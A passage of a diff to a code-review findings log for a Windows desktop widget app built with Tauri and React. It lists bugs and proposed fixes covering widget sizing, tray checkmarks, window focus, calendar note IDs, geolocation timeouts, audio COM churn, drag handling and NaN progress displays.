+- **Why**: `SpeedtestWidget.tsx` hardcodes `className="w-[360px] h-[256px] ..."` via string interpolation instead of using `cn()` (`tailwind-merge`). This causes `className="w-full h-full"` passed by `App.tsx` to conflict with fixed CSS dimensions, forcing the component to render at 360px width inside a 304px net available area.
+- **Fix**:
+```diff
+--- a/src/widgets/speedtest/SpeedtestWidget.tsx
++++ b/src/widgets/speedtest/SpeedtestWidget.tsx
+@@ -85,7 +85,7 @@ export const SpeedtestWidget: FC<SpeedtestWidgetProps> = ({
+   return (
+     <Card
+       variant="acrylic"
+-      className={`w-[360px] h-[256px] p-3 text-[var(--fluent-text-primary)] font-['Segoe_UI_Variable_Text',_'Segoe_UI',_sans-serif] flex flex-col justify-between select-none overflow-hidden ${className}`}
++      className={cn("w-full h-full p-3 text-[var(--fluent-text-primary)] flex flex-col justify-between select-none overflow-hidden", className)}
+       data-testid="speedtest-widget"
+     >
+       {/* Top Header */}
+```
+
+---
+
+### [MINOR] [OPEN] M1-06 System Tray Menu CheckMenuItems Never Update Checked State on Toggle
+- **Status**: OPEN
+- **Where**: `src-tauri/src/tray/mod.rs:250-310`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: contract
+- **Scenario**: User opens the system tray context menu and toggles "Lock Positions" or any of the 10 widget checkboxes.
+- **Why**: Unlike `layout_independent` and `layout_docked` (which invoke `.set_checked(bool)` on lines 318-319), `toggle_lock` and all 10 `toggle_<widget>` handlers mutate config but never update the tray menu checkmark via `.set_checked()`. The checkmarks in the tray menu remain frozen in their startup state.
+- **Fix**:
+```diff
+--- a/src-tauri/src/tray/mod.rs
++++ b/src-tauri/src/tray/mod.rs
+@@ -253,6 +253,7 @@ pub fn setup_tray<R: Runtime>(app: &AppHandle<R>) -> Result<TrayIcon<R>, Box<dyn
+                     tauri::async_runtime::spawn(async move {
+                         if let Ok(mut config) = load_config(handle.clone()).await {
+                             config.lock_positions = !config.lock_positions;
++                            let _ = toggle_lock.set_checked(config.lock_positions);
+                             let _ = save_config_immediate(handle, config).await;
+                         }
+                     });
+```
+
+---
+
+### [MINOR] [OPEN] M1-07 `open_widget_window` Disables `no_activate` Allowing Desktop Widgets to Steal Focus
+- **Status**: OPEN
+- **Where**: `src-tauri/src/lib.rs:107`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: A user clicks on a floating widget while running a full-screen game or typing in an active foreground application.
+- **Why**: `open_widget_window` passes `no_activate: false` to `WindowSetupOptions` (whereas docked mode and `WindowSetupOptions::default()` pass `true`). Consequently, `apply_tool_window_styles` omits `WS_EX_NOACTIVATE`, causing independent desktop widgets to steal window focus.
+- **Fix**:
+```diff
+--- a/src-tauri/src/lib.rs
++++ b/src-tauri/src/lib.rs
+@@ -106,5 +106,5 @@ pub mod integration {
+                 WindowSetupOptions {
+                     id: widget_id.clone(),
+                     is_widget: true,
+-                    no_activate: false,
++                    no_activate: true,
+                     dark_mode: config.theme != "light",
+```
+
+---
+
+### [MINOR] [OPEN] M1-08 Predefined Action Target Resolution Rejects "volume" Identifier
+- **Status**: OPEN
+- **Where**: `src-tauri/src/actions/mod.rs:15-24`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: contract
+- **Scenario**: User triggers quick action `"volume"` (as configured in `model.rs:373` and default tiles).
+- **Why**: `resolve_action_target` only matches `"sound"` and fails on `"volume"`, returning `Err("Unknown action identifier: 'volume'")` instead of opening Windows audio settings.
+- **Fix**:
+```diff
+--- a/src-tauri/src/actions/mod.rs
++++ b/src-tauri/src/actions/mod.rs
+@@ -15,5 +15,5 @@ pub fn resolve_action_target(
+     match action_id {
+-        "sound" => Ok(ResolvedAction::Uri("ms-settings:sound".to_string())),
++        "sound" | "volume" => Ok(ResolvedAction::Uri("ms-settings:sound".to_string())),
+         "bluetooth" => Ok(ResolvedAction::Uri("ms-settings:bluetooth".to_string())),
+```
+
+---
+
+### [MINOR] [FIXED] M2-04 Date Whitespace Lookup Divergence in `remove_calendar_note` and `toggle_calendar_note`
+- **Status**: FIXED
+- **Where**: `src-tauri/src/calendar/mod.rs:44`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: While `add_note_to_map` trims the date parameter before inserting into the `HashMap` (`date_trimmed = date.trim()`), `remove_note_from_map` and `toggle_note_in_map` query `events.get_mut(date)` directly without trimming. If a date string contains leading or trailing whitespace (e.g. `"2026-10-27 "`), the lookup fails, and the note can neither be removed nor marked completed.
+- **Why**: Inconsistent input normalization between note insertion (trimmed) and query/deletion (untrimmed).
+- **Fix**:
+```diff
+--- a/src-tauri/src/calendar/mod.rs
++++ b/src-tauri/src/calendar/mod.rs
+@@ -43,3 +43,3 @@ pub fn remove_note_from_map(
+ ) {
+-    if let Some(notes) = events.get_mut(date) {
++    if let Some(notes) = events.get_mut(date.trim()) {
+         notes.retain(|n| n.id != note_id);
+@@ -57,3 +57,3 @@ pub fn toggle_note_in_map(
+ ) {
+-    if let Some(notes) = events.get_mut(date) {
++    if let Some(notes) = events.get_mut(date.trim()) {
+         if let Some(note) = notes.iter_mut().find(|n| n.id == note_id) {
+```
+
+### [MINOR] [FIXED] M2-05 Upload Benchmark Progress Freeze and Low Bandwidth Timeout Failure
+- **Status**: FIXED
+- **Where**: `src-tauri/src/speedtest/mod.rs:183-236`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: In `run_upload_phase`, the 3.5 MB buffer is sent in a single `body(payload).send().await` call. During upload (which can take 15-20 seconds on modest connections), progress stays frozen at 0.1 with zero interim progress events. Furthermore, on upload speeds below ~1.12 Mbps, the 25-second overall timeout aborts the entire test, discarding already completed ping and download measurements and returning an error.
+- **Why**: Upload phase does not stream chunks with progress emissions, and treats upload failure as fatal to the entire benchmark pipeline.
+- **Fix**:
+```diff
+--- a/src-tauri/src/speedtest/mod.rs
++++ b/src-tauri/src/speedtest/mod.rs
+@@ -298,18 +298,10 @@ pub async fn run_speedtest<R: Runtime>(
+     // Phase 3: Upload Speed
+-    let upload_mbps = match run_upload_phase(&client, &app, CF_SPEEDTEST_UP_URL, ping_ms, jitter_ms, download_mbps).await {
++    let upload_mbps = match run_upload_phase(&client, &app, CF_SPEEDTEST_UP_URL, ping_ms, jitter_ms, download_mbps).await
++    {
+         Ok(mbps) => mbps,
+         Err(e) => {
+-            let _ = app.emit(
+-                "speedtest-progress",
+-                SpeedtestProgress {
+-                    stage: "error".to_string(),
+-                    progress: 0.0,
+-                    current_mbps: 0.0,
+-                    ping_ms: Some(ping_ms),
+-                    jitter_ms: Some(jitter_ms),
+-                    download_mbps: None,
+-                    upload_mbps: None,
+-                    error: Some(e.clone()),
+-                },
+-            );
+-            return Err(e);
++            log::warn!("Speedtest upload phase failed: {}", e);
++            0.0
+         }
+     };
+```
+
+### [MINOR] [FIXED] M2-06 Debounced Config Drops Unsaved Changes on Application Termination
+- **Status**: FIXED
+- **Where**: `src-tauri/src/config/storage.rs:288-320`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: MEDIUM
+- **Category**: robustness
+- **Scenario**: When a user drags or moves a desktop widget, `save_config` dispatches `save_debounced`, resetting the 500ms timer. If the application is closed or restarted within 500ms of the move, the spawned debounce task is terminated on process exit without flushing `is_dirty` config to disk, silently reverting the latest widget positions to their previous values.
+- **Why**: `ConfigManager` lacks a synchronous or asynchronous flush method to force-persist pending dirty configuration upon window closure or application exit.
+- **Fix**:
+```diff
+--- a/src-tauri/src/config/storage.rs
++++ b/src-tauri/src/config/storage.rs
+@@ -374,2 +374,11 @@ impl ConfigManager {
+     }
++
++    pub async fn flush(&self) -> Result<(), String> {
++        if self.is_dirty.swap(false, Ordering::SeqCst) {
++            let config = self.current_config.read().await.clone();
++            let path = self.config_path.clone();
++            tokio::task::spawn_blocking(move || save_config_atomic(&path, &config))
++                .await
++                .map_err(|e| format!("Flush error: {e}"))?
++        } else {
++            Ok(())
++        }
++    }
+```
+
+### [MINOR] [FIXED] M2-07 Calendar Note ID Collision on Concurrent or Sub-Millisecond Creation
+- **Status**: FIXED
+- **Where**: `src-tauri/src/calendar/mod.rs:25-32`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: MEDIUM
+- **Category**: bug
+- **Scenario**: When notes are added without an explicit ID (e.g. batch creation or rapid input), IDs are generated using `as_millis()`. If two notes are created within the same millisecond, they receive identical IDs (`note_<epoch_millis>`). When the user later attempts to delete or toggle one note, `notes.retain(|n| n.id != note_id)` deletes both notes, or `toggle_note_in_map` modifies only the first duplicate, corrupting note tracking.
+- **Why**: ID generation relies solely on low-resolution millisecond timestamps without an atomic sequence counter or nanosecond entropy.
+- **Fix**:
+```diff
+--- a/src-tauri/src/calendar/mod.rs
++++ b/src-tauri/src/calendar/mod.rs
+@@ -24,8 +24,10 @@ pub fn add_note_to_map(
+         let mut new_note = note;
+         if new_note.id.trim().is_empty() {
++            static COUNTER: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
++            let count = COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+             new_note.id = format!(
+-                "note_{}",
++                "note_{}_{}",
+                 std::time::SystemTime::now()
+                     .duration_since(std::time::UNIX_EPOCH)
+                     .unwrap_or_default()
+-                    .as_millis()
++                    .as_nanos(),
++                count
+             );
+         }
+```
+
+### [MINOR] [FIXED] M2-08 Blocking WinRT Geolocation Thread Leak on Tokio Timeout
+- **Status**: FIXED
+- **Where**: `src-tauri/src/geo/winrt.rs:45-51`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: MEDIUM
+- **Category**: performance
+- **Scenario**: When Windows Location Services are unresponsive or searching for satellite/Wi-Fi positioning, `get_windows_location` times out after 10 seconds via `tokio::time::timeout`. However, dropping the Tokio `JoinHandle` does not cancel the underlying blocking thread running `winrt::get_geoposition_coords`, which remains blocked on `async_op.get()` for up to 60+ seconds (WinRT's internal default timeout). Repeated queries leak blocking worker threads in Tokio's pool until WinRT eventually aborts.
+- **Why**: `winrt::get_geoposition_coords` calls `GetGeopositionAsync().get()` without configuring WinRT's timeout overload (`GetGeopositionAsyncWithAgeAndTimeout`).
+- **Fix**:
+```diff
+--- a/src-tauri/src/geo/winrt.rs
++++ b/src-tauri/src/geo/winrt.rs
+@@ -44,3 +44,8 @@ pub fn get_geoposition_coords() -> Result<(f64, f64), String> {
+ 
+-    let async_op = geolocator
+-        .GetGeopositionAsync()
++    // Request geoposition with 10s maximum timeout at WinRT level to release the thread
++    let timeout = windows::Foundation::TimeSpan {
++        Duration: 100_000_000, // 10 seconds in 100-nanosecond units
++    };
++    let max_age = windows::Foundation::TimeSpan { Duration: 0 };
++    let async_op = geolocator
++        .GetGeopositionAsyncWithAgeAndTimeout(max_age, timeout)
+         .map_err(|e| format!("Failed to request geoposition async: {e}"))?;
+```
+
+### [MINOR] [OPEN] M3-08 GSMTC thumbnail extraction repeatedly queries COM for media without artwork
+- **Status**: OPEN
+- **Where**: `src-tauri/src/media/gsmtc.rs:188-214`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance [lens: F1b]
+- **Scenario**: A user plays browser audio, podcasts, or music without embedded cover art. `get_cached_album_art(&track_id)` returns `None`. Every 500ms polling tick, `read_session_data` requests `media_props.Thumbnail()`, executes `thumb_ref.OpenReadAsync()?.get()`, and attempts to read stream bytes. Because no image data is produced, the cache is never populated with a sentinel. The thread incurs repeated COM stream allocation and blocking `.get()` waits twice per second indefinitely.
+- **Why**: The cache only records successful thumbnail extractions. Negative lookups (tracks without thumbnails) are not cached, bypassing the cache check on every 500ms cycle.
+- **Fix**:
+```diff
+--- a/src-tauri/src/media/gsmtc.rs
++++ b/src-tauri/src/media/gsmtc.rs
+@@ -188,4 +188,6 @@ mod win {
+         // Thumbnail extraction: check in-memory cache first to prevent redundant COM I/O & allocations
+         let mut album_art_url = None;
+-        if get_cached_album_art(&track_id).is_some() {
++        if let Some(art) = get_cached_album_art(&track_id) {
++            if !art.bytes.is_empty() {
++                album_art_url = Some(format!("vvidget://album-art?t={}", track_id));
++            }
++        } else if let Ok(thumb_ref) = media_props.Thumbnail() {
+@@ -211,2 +213,4 @@ mod win {
+                                 }
+                             }
++                        } else {
++                            set_cached_album_art(&track_id, Vec::new(), String::new());
++                        }
+```
+
+### [MINOR] [OPEN] M3-09 `validate_launch_target` rejects standard desktop gaming launcher URI schemes
+- **Status**: OPEN
+- **Where**: `src-tauri/src/launcher/mod.rs:416-427`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: contract
+- **Scenario**: A user creates a custom launcher item targeting another gaming client or desktop application (e.g. `goggalaxy://`, `battlenet://`, `ea://`, `xbox://`, `discord://`, `spotify:`). `validate_launch_target` rejects the configuration with `"Target must be an allowlisted URI scheme or an absolute file path"`.
+- **Why**: The URI allowlist is restricted to Steam and Epic Games, omitting established gaming and productivity desktop protocols.
+- **Fix**:
+```diff
+--- a/src-tauri/src/launcher/mod.rs
++++ b/src-tauri/src/launcher/mod.rs
+@@ -421,4 +421,10 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
+         "com.epicgames.launcher:",
++        "goggalaxy://",
++        "battlenet://",
++        "ea://",
++        "xbox://",
++        "discord://",
++        "spotify:",
+         "https://",
+         "http://",
+     ];
+```
+
+### [MINOR] [OPEN] M3-10 Cold startup delay from synchronous 200ms sleep in `MetricsCollector::new()`
+- **Status**: OPEN
+- **Where**: `src-tauri/src/sysinfo/collector.rs:28-30`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance
+- **Scenario**: During cold application start, `lib.rs::run()` instantiates `MetricsCollector::new()` on the main thread before creating windows or mounting the tray. Line 29 performs a 200ms sleep (`std::thread::sleep(Duration::from_millis(200))`), adding 200ms of latency before the user sees the desktop dock.
+- **Why**: The 200ms sleep was added to establish a baseline CPU delta, but running it synchronously on the main application thread unnecessarily delays application launch.
+- **Fix**:
+```diff
+--- a/src-tauri/src/sysinfo/collector.rs
++++ b/src-tauri/src/sysinfo/collector.rs
+@@ -28,3 +28,2 @@ impl MetricsCollector {
+-        // Initial 200ms sleep before first CPU sample to eliminate 0.0% artifacts
+-        std::thread::sleep(Duration::from_millis(200));
+         system.refresh_cpu_all();
+```
+
+### [MINOR] [OPEN] M3-11 Sysinfo background worker executes `block_on` in an inner loop every 500ms
+- **Status**: OPEN
+- **Where**: `src-tauri/src/sysinfo/mod.rs:48-55`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance
+- **Scenario**: The sysinfo worker runs on a dedicated OS thread. Every 500ms, line 51 calls `tauri::async_runtime::block_on(config_manager.get_config())` to read polling rate durations. Invoking Tokio `block_on` runtime synchronization on every loop iteration produces continuous scheduling overhead and unnecessary lock contention.
+- **Why**: Polling rates change infrequently. Caching the configuration and refreshing it periodically (or reactively upon `config-changed`) avoids entering the Tokio runtime on every iteration.
+- **Fix**:
+```diff
+--- a/src-tauri/src/sysinfo/mod.rs
++++ b/src-tauri/src/sysinfo/mod.rs
+@@ -48,4 +48,6 @@ pub fn start_metrics_worker<R: Runtime>(
+             log::info!("System metrics background worker started");
++            let mut config = tauri::async_runtime::block_on(config_manager.get_config());
++            let mut last_config_check = std::time::Instant::now();
+ 
+             loop {
+-                let config = tauri::async_runtime::block_on(config_manager.get_config());
++                if last_config_check.elapsed() >= Duration::from_secs(5) {
++                    config = tauri::async_runtime::block_on(config_manager.get_config());
++                    last_config_check = std::time::Instant::now();
++                }
+```
+
+### [MINOR] [OPEN] M3-12 Core Audio commands recreate device enumerator and endpoint volume on every slider tick
+- **Status**: OPEN
+- **Where**: `src-tauri/src/audio/mod.rs:10-23`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance [lens: F1b]
+- **Scenario**: When a user drags the master volume slider, `set_master_volume` is invoked on each input event (~60 times per second). Every invocation calls `get_endpoint_volume()`, which executes `CoCreateInstance` to build `MMDeviceEnumerator`, queries `GetDefaultAudioEndpoint`, and calls `device.Activate` for `IAudioEndpointVolume`. This produces continuous COM allocation, interface querying, and release churn across Tokio blocking threads during slider interaction.
+- **Why**: `get_endpoint_volume()` instantiates and disposes the entire Core Audio COM pipeline on every call rather than caching or batching the endpoint volume interface.
+- **Fix**:
+```diff
+--- a/src-tauri/src/audio/mod.rs
++++ b/src-tauri/src/audio/mod.rs
+@@ -10,3 +10,4 @@ mod win {
+-    pub fn get_endpoint_volume() -> Result<IAudioEndpointVolume, String> {
++    // Caching or reusing the endpoint volume avoids repetitive CoCreateInstance on high-frequency slider events
++    pub fn with_endpoint_volume<T, F: FnOnce(&IAudioEndpointVolume) -> Result<T, String>>(f: F) -> Result<T, String> {
+         unsafe {
+             let enumerator: IMMDeviceEnumerator =
+```
+
+### [MINOR] [OPEN] M4-04 Drag activates on stationary clicks without distance threshold, causing accidental grid snapping and skeleton flicker
+- **Status**: OPEN
+- **Where**: `src/hooks/useGridDrag.ts:261-306`, `src/hooks/useGridDrag.ts:402-435`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: User clicks the header of a widget without moving the mouse (e.g. to focus the window or click near the grip). Because drag activation and skeleton preview invocation occur immediately when async initialization finishes, the skeleton preview window flashes, and when the mouse is released, `endDrag` executes `findNearestNonOverlappingSlot` and repositions the widget to a snapped slot even though no drag movement occurred.
+- **Why**: Drag activation is triggered purely on `onPointerDown` completion rather than requiring pointer movement past a minimum threshold (e.g. 3-5px).
+- **Fix**:
+```diff
+--- a/src/hooks/useGridDrag.ts
++++ b/src/hooks/useGridDrag.ts
+@@ -314,2 +314,7 @@
+       const deltaX = e.screenX - dragRef.current.startScreenX;
+       const deltaY = e.screenY - dragRef.current.startScreenY;
++      if (!isDragging && Math.hypot(deltaX, deltaY) < 4) {
++        return;
++      }
++      if (!isDragging) {
++        setIsDragging(true);
++        onDragStateChange?.(true);
++      }
+```
+
+### [MINOR] [OPEN] M4-05 Unhandled promise rejections on floating appWindow.setPosition calls in useGridDrag
+- **Status**: OPEN
+- **Where**: `src/hooks/useGridDrag.ts:331`, `src/hooks/useGridDrag.ts:468`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: During rapid pointer movement or when a widget window is being closed/destroyed during drag, `appWindow.setPosition(...)` returns a rejected promise. Because `void` is used without `await` or `.catch()`, the rejection escapes the synchronous `try ... catch` block and causes an unhandled promise rejection error on the window.
+- **Why**: The synchronous `try ... catch` block cannot intercept asynchronous promise rejections from un-awaited promises.
+- **Fix**:
+```diff
+--- a/src/hooks/useGridDrag.ts
++++ b/src/hooks/useGridDrag.ts
+@@ -330,3 +330,3 @@
+       try {
+         const appWindow = getCurrentWindow();
+-        void appWindow.setPosition(new LogicalPosition(targetX, targetY));
++        appWindow.setPosition(new LogicalPosition(targetX, targetY)).catch(() => {});
+         onPositionChange?.(targetX, targetY);
+```
+
+### [MINOR] [OPEN] M4-06 Missing light-theme status color tokens in fluent.css causes illegible text contrast
+- **Status**: OPEN
+- **Where**: `src/styles/fluent.css:24-26`, `src/styles/fluent.css:36-55`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: contract
+- **Scenario**: When the user selects Light Theme (`.theme-light`), UI components like `Badge` and `ProgressBar` continue using dark-mode status colors: `--fluent-warning: #fce100` (bright yellow) and `--fluent-error: #ff99a4` (light pastel pink). On light acrylic or white card backgrounds, bright yellow text has a contrast ratio of ~1.15:1 and light pink text has ~1.3:1, rendering status messages completely illegible and failing WCAG AA guidelines.
+- **Why**: `.theme-light` in `src/styles/fluent.css` defines overrides for surface background and text colors but omits definitions for `--fluent-success`, `--fluent-warning`, and `--fluent-error`.
+- **Fix**:
+```diff
+--- a/src/styles/fluent.css
++++ b/src/styles/fluent.css
+@@ -54,3 +54,8 @@
+   --fluent-control-bg: rgba(0, 0, 0, 0.04);
+   --fluent-control-active: rgba(0, 0, 0, 0.08);
++
++  /* Status Colors - Light Theme */
++  --fluent-success: #0f7b0f;
++  --fluent-warning: #9d5d00;
++  --fluent-error: #c42b1c;
+ }
+```
+
+### [MINOR] [OPEN] M4-07 Tooltip component renders empty styled container when content is empty or null
+- **Status**: OPEN
+- **Where**: `src/components/ui/Tooltip.tsx:66-79`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: If a parent component renders `<Tooltip content="">` or passes `content={null}`, hovering over the target element for 200ms causes `isVisible` to become `true`, which renders an empty 20px x 10px floating box with background, border, and drop shadow over the UI.
+- **Why**: `Tooltip` checks `{isVisible && (<div role="tooltip">...)}` without verifying that `content` is present and non-empty.
+- **Fix**:
+```diff
+--- a/src/components/ui/Tooltip.tsx
++++ b/src/components/ui/Tooltip.tsx
+@@ -66,3 +66,3 @@
+       {children}
+-      {isVisible && (
++      {isVisible && Boolean(content) && (
+         <div
+```
+
+### [MINOR] [OPEN] M4-08 ProgressBar produces NaN% display and invalid ARIA attribute when value is not a finite number
+- **Status**: OPEN
+- **Where**: `src/components/ui/ProgressBar.tsx:30-31`, `src/components/ui/ProgressBar.tsx:59`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: When telemetry or metrics data is loading or missing (`value: NaN` or `undefined`), `ProgressBar` computes `percentage` as `NaN`. This displays `"NaN%"` in the UI label, applies invalid inline CSS `width: NaN%`, and sets `aria-valuenow="NaN"`, which violates the W3C WAI-ARIA specification for `role="progressbar"`.
+- **Why**: `Math.max(NaN, min)` returns `NaN`, propagating non-finite values throughout all calculations without a fallback check.
+- **Fix**:
+```diff
+--- a/src/components/ui/ProgressBar.tsx
++++ b/src/components/ui/ProgressBar.tsx
+@@ -30,2 +30,3 @@
+-    const clampedValue = max <= min ? min : Math.min(Math.max(value, min), max);
++    const numericValue = Number.isFinite(value) ? value : min;
++    const clampedValue = max <= min ? min : Math.min(Math.max(numericValue, min), max);
+     const percentage = max <= min ? 0 : Math.round(((clampedValue - min) / (max - min)) * 100);
+```
+
+### [MINOR] [OPEN] M5-04 Bluetooth status badge displays green "Aktiv" when all paired devices are disconnected
+- **Status**: OPEN
+- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:147, 172-179`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: User has 2 paired devices (e.g. keyboard and mouse), but both are powered off and disconnected. The Bluetooth widget header displays a green badge labeled "Aktiv", misleading the user into believing an active wireless connection exists.
+- **Why**: `statusText` evaluates `devices.length > 0` rather than `devices.some(d => d.connected)`, treating pairing presence as active connectivity.
 - **Fix**:
 ```diff
 --- a/src/widgets/bluetooth/BluetoothWidget.tsx
@@ -1676,14 +1886,41 @@
 
 ---
 
-### [MINOR] [OPEN] M5-09 MetricBar unvalidated `NaN` produces `"NaN%"` and invalid CSS progress bar width
+### [MINOR] [OPEN] M5-05 Missing volume poll interval or OS event listener leaves slider permanently out of sync
 - **Status**: OPEN
-- **Where**: `src/widgets/resources/MetricBar.tsx:28-30`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src/hooks/useMasterVolume.ts:38-73`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: robustness
-- **Scenario**: During system startup or if a sensor returns `NaN`, `percent` passed to MetricBar is `NaN`. MetricBar renders `"NaN%"` and passes `NaN` to `ProgressBar`, corrupting CSS inline styling.
-- **Why**: `Math.round(NaN)` returns `NaN`, and `Math.min(Math.max(NaN, 0), 100)` evaluates to `NaN` without a fallback check.
+- **Scenario**: User adjusts system volume using keyboard hardware keys (Volume Up/Down) or the Windows taskbar slider. The widget volume slider never updates and stays on the initial mount value.
+- **Why**: `useMasterVolume` invokes `refresh()` only once on initial component mount and lacks periodic polling or native WASAPI endpoint callbacks.
+- **Fix**:
+```diff
+--- a/src/hooks/useMasterVolume.ts
++++ b/src/hooks/useMasterVolume.ts
+@@ -67,3 +67,8 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
+     if (isTauri()) {
+       void refresh();
++      const interval = setInterval(() => {
++        void refresh();
++      }, 3000);
++      return () => {
++        isMountedRef.current = false;
++        clearInterval(interval);
++      };
+     }
+```
+
+---
+
+### [MINOR] [OPEN] M5-06 MetricBar unvalidated `NaN` produces `"NaN%"` and invalid CSS progress bar width
+- **Status**: OPEN
+- **Where**: `src/widgets/resources/MetricBar.tsx:28-30`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: During system wake or when sensor readings are momentarily uninitialized, `percent` passed to `MetricBar` is `NaN`. MetricBar renders `"NaN%"` and passes `NaN` to `ProgressBar`, resulting in `style={{ width: "NaN%" }}` and `aria-valuenow={NaN}`.
+- **Why**: `Math.round(NaN)` returns `NaN`, and `Math.min(Math.max(NaN, 0), 100)` evaluates to `NaN` without a finite fallback guard.
 - **Fix**:
 ```diff
 --- a/src/widgets/resources/MetricBar.tsx
@@ -1698,452 +1935,434 @@
 
 ---
 
-### [MINOR] [OPEN] M5-10 Dead code and continuous CPU history array allocations for unrendered `MiniGraph`
+### [MINOR] [OPEN] M5-07 False positive "Gestartet" feedback when quick action fails in QuickSettingsWidget
 - **Status**: OPEN
-- **Where**: `src/widgets/resources/MiniGraph.tsx:1-107`, `src/hooks/useSystemMetrics.ts:72-88`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: Every second, telemetry events trigger `appendCpuSample`. The hook slices and allocates a new 20-element number array for `cpuHistory`, triggering re-renders, but `ResourceWidget` never imports or renders `MiniGraph` or `cpuHistory`.
-- **Why**: `MiniGraph` was unlinked during design refactors without cleaning up unused component exports or removing the unrendered history accumulator from the hook.
-- **Fix**: Either re-integrate `MiniGraph` into `ResourceWidget` under CPU usage, or remove `cpuHistory` state accumulation from `useSystemMetrics.ts` when no sparkline is rendered.
-
-### [MINOR] [OPEN] M6-01 Hero temperature unit disconnected from number as lowercase-like orphan "C"
-- **Status**: OPEN
-- **Where**: `src/widgets/weather/WeatherWidget.tsx:160-168`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:201-228`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: bug
-- **Scenario**: In `WeatherWidget`, the current temperature renders as `14°` in a 30px (3xl) font, followed by an orphaned `C` in muted 12px (`text-xs text-[var(--fluent-text-secondary)]`) separated by a `gap-1` flex offset. In Segoe UI Variable, this renders visually as `14°  C` where the tiny, muted "C" looks like an accidental subscript / lowercase letter "c", while all other temperatures in the widget (`• Gefühlt 12°`, hourly `15°`, daily `18° / 9°`) omit "C" entirely and `formatTemperature` in `wmoCodes.ts` specifies unified `${rounded}°C`.
-- **Why**: `WeatherWidget.tsx` fragments the temperature value and Celsius unit across two distinct flex items with `gap-1`, styling the unit with `text-xs text-[var(--fluent-text-secondary)]` instead of displaying a unified temperature string.
+- **Scenario**: User clicks a custom quick action tile targeting an invalid path or prohibited executable. The backend returns an error. The error is swallowed, but because `setActiveFeedback(actionId)` was called unconditionally at the start of the handler, the tile displays "Gestartet" with a spinning sparkle icon, falsely indicating success.
+- **Why**: `setActiveFeedback` is set before invoking the IPC command instead of only after successful execution.
 - **Fix**:
 ```diff
---- a/src/widgets/weather/WeatherWidget.tsx
-+++ b/src/widgets/weather/WeatherWidget.tsx
-@@ -160,9 +160,8 @@ export const WeatherWidget: FC<WeatherWidgetProps> = ({ className = "" }) => {
-           <div className="flex items-baseline gap-1">
-             <span
-               className="text-3xl font-light tracking-tight text-[var(--fluent-text-primary)]"
-               data-testid="weather-current-temp"
-             >
--              {current.temperatureC}°
-+              {current.temperatureC}°C
-             </span>
--            <span className="text-xs text-[var(--fluent-text-secondary)]">C</span>
-           </div>
+--- a/src/widgets/quick-settings/QuickSettingsWidget.tsx
++++ b/src/widgets/quick-settings/QuickSettingsWidget.tsx
+@@ -201,3 +201,2 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
+   const handleActionClick = async (actionId: string) => {
+-    setActiveFeedback(actionId);
+ 
+@@ -222,4 +221,6 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
+       });
+-    } catch {
+-      // Safe fallback in web/test environment
++      setActiveFeedback(actionId);
++      setTimeout(() => {
++        setActiveFeedback((prev) => (prev === actionId ? null : prev));
++      }, 700);
++    } catch {
++      // Action failed to execute
+     } finally {
+-      setTimeout(() => {
+-        setActiveFeedback((prev) => (prev === actionId ? null : prev));
+-      }, 700);
+     }
 ```
 
-### [MINOR] [OPEN] M6-07 Note input '+' button positioned with hardcoded `top-[3px]` against padded form, causing vertical misalignment
-- **Status**: OPEN
-- **Where**: `src/widgets/calendar/CalendarWidget.tsx:192-207`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: In `CalendarWidget`, the '+' button inside the note input is offset using a hardcoded `top-[3px]` on a form element that has `pb-2`. Under high-DPI scaling or non-standard system fonts, the button is visibly uncentered against the input field, sitting too high and clipping against the top border.
-- **Why**: The `<form>` element applies padding-bottom (`pb-2`), so an absolute child pinned to `top-[3px]` does not center vertically within the `<input>` element.
-- **Fix**:
-```diff
---- a/src/widgets/calendar/CalendarWidget.tsx
-+++ b/src/widgets/calendar/CalendarWidget.tsx
